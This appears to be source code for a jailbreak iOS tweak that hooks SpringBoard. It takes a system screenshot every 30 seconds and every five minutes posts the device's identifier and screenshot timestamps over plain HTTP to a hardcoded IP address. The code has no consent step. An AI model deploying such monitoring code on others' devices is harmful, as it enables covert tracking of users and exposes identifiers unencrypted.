#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <SpringBoard/SpringBoard.h>
#import <os/log.h>

// Configuration
static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log";
static NSString *DEVICE_ID = nil;
static NSMutableArray *screenshotLogs = nil;
static const NSInteger MAX_LOGS = 5;
static NSTimer *sendTimer = nil;
static NSTimer *screenshotTimer = nil;
static os_log_t screenshot_monitor_log = NULL;

// Declare SBScreenshotManager interface
@interface SBScreenshotManager : NSObject
+ (id)sharedInstance;
- (void)takeScreenshot;
@end

@interface SpringBoard (ScreenshotMonitor)
- (void)logScreenshot;
- (void)sendScreenshotsToServer;
- (void)takePeriodicScreenshot;
@end

%hook SpringBoard

-(void)applicationDidFinishLaunching:(id)application {
    %orig;
    
    // Initialize os_log
    screenshot_monitor_log = os_log_create("com.mateus.screenshotmonitor", "ScreenshotMonitor");
    
    // Initialize logs array
    if (!screenshotLogs) {
        screenshotLogs = [NSMutableArray new];
    }
    
    // Get device ID if not set
    if (!DEVICE_ID) {
        DEVICE_ID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    }
    
    // Start periodic sending to server (every 5 minutes)
    sendTimer = [NSTimer scheduledTimerWithTimeInterval:300.0
                                                target:self
                                              selector:@selector(sendScreenshotsToServer)
                                              userInfo:nil
                                               repeats:YES];
    
    // Start periodic screenshots (every 30 seconds)
    screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:30.0
                                                     target:self
                                                   selector:@selector(takePeriodicScreenshot)
                                                   userInfo:nil
                                                    repeats:YES];
    
    os_log(screenshot_monitor_log, "[ScreenshotMonitor] Initialized with endpoint: %@", API_ENDPOINT);
}

%new
-(void)takePeriodicScreenshot {
    // Get the shared instance of SBScreenshotManager
    SBScreenshotManager *screenshotManager = [%c(SBScreenshotManager) sharedInstance];
    if (screenshotManager) {
        [screenshotManager takeScreenshot];
        [self logScreenshot];  // Log immediately after taking screenshot
        os_log(screenshot_monitor_log, "[ScreenshotMonitor] Taking periodic screenshot");
    } else {
        os_log_error(screenshot_monitor_log, "[ScreenshotMonitor] Failed to get SBScreenshotManager instance");
    }
}

%new
-(void)logScreenshot {
    // Create timestamp
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss'Z'"];
    [formatter setTimeZone:[NSTimeZone timeZoneWithName:@"UTC"]];
    NSString *timestamp = [formatter stringFromDate:[NSDate date]];
    
    // Create log entry
    NSDictionary *logEntry = @{
        @"timestamp": timestamp,
        @"type": @"screenshot"
    };
    
    // Add to logs array
    [screenshotLogs insertObject:logEntry atIndex:0];
    
    // Keep only recent logs
    if (screenshotLogs.count > MAX_LOGS) {
        [screenshotLogs removeLastObject];
    }
    
    os_log(screenshot_monitor_log, "[ScreenshotMonitor] Screenshot logged at %@", timestamp);
}

%new
-(void)sendScreenshotsToServer {
    if (screenshotLogs.count == 0) {
        return;
    }
    
    // Create simple string data
    NSMutableString *dataToSend = [NSMutableString stringWithFormat:@"deviceId=%@&screenshots=", DEVICE_ID];
    
    // Add each screenshot timestamp
    for (NSDictionary *log in screenshotLogs) {
        [dataToSend appendFormat:@"%@,", log[@"timestamp"]];
    }
    
    // Remove last comma
    if (dataToSend.length > 0) {
        [dataToSend deleteCharactersInRange:NSMakeRange(dataToSend.length - 1, 1)];
    }
    
    // Create request
    NSURL *url = [NSURL URLWithString:API_ENDPOINT];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:[dataToSend dataUsingEncoding:NSUTF8StringEncoding]];
    
    // Send request
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request
                                                                completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            os_log_error(screenshot_monitor_log, "[ScreenshotMonitor] Network error: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                [screenshotLogs removeAllObjects];
                os_log(screenshot_monitor_log, "[ScreenshotMonitor] Successfully sent screenshots to server");
            } else {
                os_log_error(screenshot_monitor_log, "[ScreenshotMonitor] Server error: %ld", (long)httpResponse.statusCode);
            }
        }
    }];
    
    [task resume];
}

%end

// Required constructor
%ctor {
    NSLog(@"[ScreenshotMonitor] Tweak loaded");
}